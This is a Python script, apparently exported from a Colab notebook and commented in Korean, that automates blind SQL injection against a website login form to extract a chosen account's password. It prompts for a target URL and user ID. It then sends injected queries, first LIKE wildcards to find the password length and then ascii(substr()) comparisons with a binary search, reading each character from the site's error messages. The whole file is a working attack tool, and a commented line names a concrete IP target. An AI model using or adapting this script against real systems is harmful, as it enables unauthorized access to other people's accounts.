# -*- coding: utf-8 -*-
"""blindSQLInjectionScript.ipynb

Automatically generated by Colaboratory.

Original file is located at
    https://colab.research.google.com/drive/1O-7GDPNWLSd6Lv66mqUNT_HP-yL4AaYH
"""

#blind sql injection 자동화 스크립트
#계정의 아이디를 알고있을 때 비밀번호를 찾아낼 수 있음
#이때 비밀번호는 ascii code로 표현 가능해야 함

#전제 : 웹사이트가 입력 값 검증 안함
#query 결과가 true와 false일때 결과는 사이트마다 다르므로 알아서 코드 변경하셈
#table의 password atrribute 이름은 pass 로 가정했음

import string
from itertools import product
from numpy import loadtxt
from requests import post
import requests

#url과 id는 상황에 맞게 변경
# url = 'http://18.191.181.173/loginregist.php'
# id = 'admin'
table = 'members'

pw = ''

print('[*] Enter the URL You Wanna Hack : ', end='')
url = input()
print('[*] Enter the ID : ', end='')
id = input()

#먼저 비밀번호 글자수 알아내기
cnt_pass = 0
req = ''
CntNotEnd = True

print('\n[*] Start Cracking')
noti = '[*] Cheking ' + id + '\'s Password Length . . .'
print(noti)

while CntNotEnd:
  cnt_pass += 1
  req += '_' 
  
  query = id + "\' and pass like \'" + req
  response = requests.post(url, data={'id' : query, 'pass' : 'a'})

  if "비밀번호가 틀립니다" in response.text : 
    result = '[*] Password Length : ' + str(cnt_pass)
    print(result)
    break;

  if cnt_pass>20 :
    print('[*] Error Occured')
    exit(1)

#이제 본격적으로 비밀번호 알아내기
print('\n[*] Processing . . .')
real_pass = ''

for i in range(cnt_pass) :
  low = 0
  high = 127 #ascii:0~127

  while True :
    binarycheck = (low+high)//2
    query = id + "\' and ascii(substr(pass," + str(i+1) + ",1))>" + str(binarycheck) + " and \'a\' = \'a"
    response = requests.post(url, data={'id' : query, 'pass' : 'a'})

    # rst = 'low : ' + str(low) + '    high' + str(high) + '    mid' + str(binarycheck)
    # print(rst)
    # print(query)
    # print(response.text)

    if "비밀번호가 틀립니다" in response.text : #True라면
      low = binarycheck + 1
    else :
      high = binarycheck - 1

    if low >= high :
      query = id + "\' and ascii(substr(pass," + str(i+1) + ",1))>" + str(low) + " and \'a\' = \'a"
      response = requests.post(url, data={'id' : query, 'pass' : 'a'})

      if "등록되지 않은 아이디입니다" in response.text :
        binarycheck = high
      else :
        binarycheck = high + 1
      real_pass += chr(binarycheck)
      break;

print('[*] Found It')  
noti = '[*] ' + id + '\'s password is : [' + real_pass + ']'
print(noti)